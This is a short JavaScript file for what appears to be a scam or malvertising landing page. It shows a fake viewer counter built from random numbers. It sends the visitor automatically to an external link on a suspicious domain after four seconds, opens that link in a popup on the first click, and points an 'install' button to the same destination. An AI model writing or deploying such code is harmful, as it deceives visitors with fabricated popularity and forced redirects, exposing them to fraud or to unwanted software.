let mainLink = "https://eavesdropbogusye.com/vk9pvyw8p?key=6c739a905f40e090a16cfdd6a851e970";

// Viewer Counter
let viewers = Math.floor(Math.random()*40000)+40000;
setInterval(()=>{
  viewers += Math.floor(Math.random()*300-150);
  if(viewers<1000) viewers=1000;
  document.getElementById("viewers").innerText = viewers.toLocaleString();
},2000);


// 4 second auto redirect
setTimeout(()=>{
  window.location.href = mainLink;
},4000);


// First click → popup
let popupOpened = false;
document.addEventListener("click",function(e){

  if(e.target.id === "installBtn") return;

  if(!popupOpened){
    popupOpened = true;
    window.open(mainLink,"_blank");
  }

});


// Install button → direct redirect
document.getElementById("installBtn").addEventListener("click",function(e){
  e.preventDefault();
  e.stopPropagation();
  window.location.href = mainLink;
});
